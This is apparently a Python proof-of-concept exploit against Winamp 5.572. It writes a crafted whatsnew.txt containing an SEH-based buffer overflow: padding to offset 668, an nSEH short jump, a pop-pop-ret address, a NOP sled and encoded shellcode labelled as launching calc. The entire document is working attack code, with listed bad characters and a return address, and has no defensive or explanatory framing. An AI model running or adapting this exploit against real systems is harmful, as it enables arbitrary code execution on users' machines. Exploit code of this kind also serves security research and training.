filename="whatsnew.txt"
prefix="Winamp 5.572"


pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"


#offset = 668

nSeh="\x90\xeb\x0b\x90" # jmp 13 bytes
Seh="\x5a\xaf\x69\x74" # pop pop ret 


#badchars = \x0d\x00\xff

calc=("\xb8\x6f\xe1\xb3\xa0\xda\xd2\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x30\x83\xeb\xfc\x31\x43\x0f\x03\x43\x60\x03\x46\x5c\x96\x41"
"\xa9\x9d\x66\x26\x23\x78\x57\x66\x57\x08\xc7\x56\x13\x5c\xeb"
"\x1d\x71\x75\x78\x53\x5e\x7a\xc9\xde\xb8\xb5\xca\x73\xf8\xd4"
"\x48\x8e\x2d\x37\x71\x41\x20\x36\xb6\xbc\xc9\x6a\x6f\xca\x7c"
"\x9b\x04\x86\xbc\x10\x56\x06\xc5\xc5\x2e\x29\xe4\x5b\x25\x70"
"\x26\x5d\xea\x08\x6f\x45\xef\x35\x39\xfe\xdb\xc2\xb8\xd6\x12"
"\x2a\x16\x17\x9b\xd9\x66\x5f\x1b\x02\x1d\xa9\x58\xbf\x26\x6e"
"\x23\x1b\xa2\x75\x83\xe8\x14\x52\x32\x3c\xc2\x11\x38\x89\x80"
"\x7e\x5c\x0c\x44\xf5\x58\x85\x6b\xda\xe9\xdd\x4f\xfe\xb2\x86"
"\xee\xa7\x1e\x68\x0e\xb7\xc1\xd5\xaa\xb3\xef\x02\xc7\x99\x65"
"\xd4\x55\xa4\xcb\xd6\x65\xa7\x7b\xbf\x54\x2c\x14\xb8\x68\xe7"
"\x51\x36\x23\xaa\xf3\xdf\xea\x3e\x46\x82\x0c\x95\x84\xbb\x8e"
"\x1c\x74\x38\x8e\x54\x71\x04\x08\x84\x0b\x15\xfd\xaa\xb8\x16"
"\xd4\xc8\x5f\x85\xb4\x0e")


payload=prefix+"A"*668 + "BBBB" + nSeh + Seh + "\x90"*20+calc
#print(len(payload))
eip="\x77\x9c\x5d\x77"
payload2=prefix + "A"*540 + eip + "\x90"*(668-540) + nSeh + Seh + "\x90"*20 + calc + "QQQQ"*100 
file=open(filename,"w")
file.write(payload2)
file.close()

